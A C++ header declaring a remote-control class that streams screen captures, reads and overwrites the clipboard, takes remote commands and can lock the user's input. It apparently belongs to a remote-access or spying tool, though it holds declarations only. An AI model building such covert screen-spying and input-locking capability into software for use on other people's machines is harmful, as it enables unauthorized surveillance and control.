#pragma once
#include "Manager.h"
#include "common.h"
#include "ScreenSpy.h"

class CRemoteController :
	public CManager
{
public:
	CRemoteController(_CIOCPClient* IOCPClient);
	~CRemoteController();
	VOID CRemoteController::HandleIO(PBYTE BufferData, ULONG BufferLength);
	static DWORD WINAPI SendProcedure(LPVOID ParameterData);
	
	VOID CRemoteController::SendBitmapInfo();
	VOID CRemoteController::SendFirstScreenData();
	VOID CRemoteController::SendNextScreenData();

	VOID CRemoteController::AnalyzeCommand(PBYTE BufferData, ULONG BufferLength);
	VOID CRemoteController::SendClipboardData();
	VOID CRemoteController::UpdataClipboardData(char* BufferData, ULONG BufferLength);

public:
	BOOL m_IsLoop;
	CScreenSpy* m_ScreenSpy;
	HANDLE m_ThreadHandle;
	BOOL m_IsBlockInput;    //为TRUE代表客户端操作锁定

};

